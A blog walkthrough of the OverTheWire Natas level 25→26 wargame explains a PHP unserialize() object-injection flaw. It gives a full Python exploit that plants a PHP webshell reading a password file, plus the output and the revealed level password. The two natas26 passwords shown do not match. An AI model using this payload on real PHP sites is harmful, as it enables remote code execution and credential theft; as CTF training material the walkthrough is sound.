---
layout: post-with-comments
title: "OverTheWire Natas Level 25 → 26 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-25-to-26/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, php, object-injection, serialization, python, requests]
description: "A step by step tutorial for OverTheWire Natas Level 25 → 26 — Python-only exploit!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-24-to-25/' | relative_url }}">← Previous: Level 24 → 25</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas26.html" target="_blank" rel="noopener">
      Official (Level 26) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-26-to-27/' | relative_url }}">
      Next: Level 26 → 27 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas26.natas.labs.overthewire.org](http://natas26.natas.labs.overthewire.org)  
Credentials: **natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE**

```bash
curl -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE 
  http://natas26.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-25-to-26/homepage.jpg' | relative_url }})

---

## Task

The code reveals a **drawing app** that unserializes user data from the `drawing` cookie:

```php
$drawing = unserialize(base64_decode($_COOKIE["drawing"]));
```

We also see a `Logger` class defined, with a `__destruct()` that writes `$exitMsg` into `$logFile`.
This is a classic **PHP Object Injection (POI)** vulnerability:

1. We can send a forged `Logger` object via cookie.
2. When unserialized, it will be stored and later destroyed.
3. On destruction, the `exitMsg` (our PHP payload) is written to `logFile` (we choose a `.php` file in `img/`).
4. Then we simply request that `.php` file to run arbitrary code.

---

## Full Python Exploit

```python
#!/usr/bin/env python3
import base64, requests

BASE = "http://natas26.natas.labs.overthewire.org/"
AUTH = ("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T")

# Crafted Logger object:
#   logFile = "img/ax.php"
#   exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27');?>"
payload = (
    'O:6:"Logger":3:{'
    's:15:"LoggerlogFile";s:10:"img/ax.php";'
    's:15:"LoggerinitMsg";s:6:"foobar";'
    's:15:"LoggerexitMsg";s:61:"<?php echo file_get_contents(\'/etc/natas_webpass/natas27\');?>";}'
)

cookie_val = base64.b64encode(payload.encode()).decode()

with requests.Session() as s:
    s.auth = AUTH
    # 1) Send malicious cookie
    s.get(BASE, cookies={"drawing": cookie_val})
    print("[i] Sent malicious cookie, creating webshell...")

    # 2) Access the dropped PHP file
    shell_url = BASE + "img/ax.php"
    r2 = s.get(shell_url)
    print("[+] Response from shell:")
    print(r2.text.strip())
```

Run it:

```bash
python3 natas26_exploit.py
```

---

## Output

```
[i] Sent malicious cookie, creating webshell...
[+] Response from shell:
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```


![result]({{ '/assets/images/natas/level-25-to-26/result.jpg' | relative_url }})

---

## Password

```
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

---

## Troubleshooting

* **Got blank page?** → Check that your payload uses `img/ax.php` and that you request that file after poisoning.
* **Cookie encoding wrong?** → Ensure you base64-encode the serialized PHP string (and URL-encode if using curl).
* **Payload not executed?** → Confirm the file ends with `.php` inside `img/`.

---

**Boom 🎉** Another step forward: we exploited **PHP object injection via unserialize()** to gain code execution. On to **natas27**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

